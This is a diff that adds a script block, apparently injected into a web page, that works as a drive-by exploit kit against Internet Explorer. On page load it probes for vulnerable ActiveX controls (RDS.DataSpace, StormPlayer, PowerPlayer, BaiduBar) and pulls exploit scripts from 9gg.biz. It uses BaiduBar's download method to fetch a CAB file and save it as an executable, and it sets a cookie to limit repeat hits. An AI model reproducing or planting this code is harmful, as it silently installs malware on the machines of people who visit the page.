@@ -1,0 +1,53 @@
+<script>
+function init()
+{
+document.write();
+}
+window.onload = init;
+if(document.cookie.indexOf('OK')==-1)
+{
+try{
+var e;
+var ado=(document.createElement("object"));
+ado.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");
+var as=ado.createobject("Adodb.Stream","")}
+catch(e){};
+finally{
+var expires=new Date();
+expires.setTime(expires.getTime()+24*60*60*1000);
+document.cookie='sci=ieinpl;path=/;expires='+expires.toGMTString();
+if(e!="[object Error]")
+{document.write("<script src=http://9gg.biz/0614.js><\/script>")}
+else
+{try{var f;var storm=new ActiveXObject("MPS.StormPlayer");}
+catch(f)
+{};
+finally
+{
+if(f!="[object Error]")
+{
+document.write("<script src=http://9gg.biz/MPS.js><\/script>")
+}}
+try{
+var g;
+var pps=new ActiveXObject("POWERPLAYER.PowerPlayerCtrl.1");
+}
+catch(g){};
+finally{
+if(g!="[object Error]")
+{document.write("<script src=http://9gg.biz/PowerPlayerCtrl.js><\/script>")}}
+try
+{
+var h;
+var obj=new ActiveXObject("BaiduBar.Tool");
+}
+catch(h){};
+finally{if(h!="[object Error]")
+{
+obj.DloadDS("http://9gg.biz/4.CAB", "bd.exe", 0)
+}
+}
+}
+}
+}
+</script>
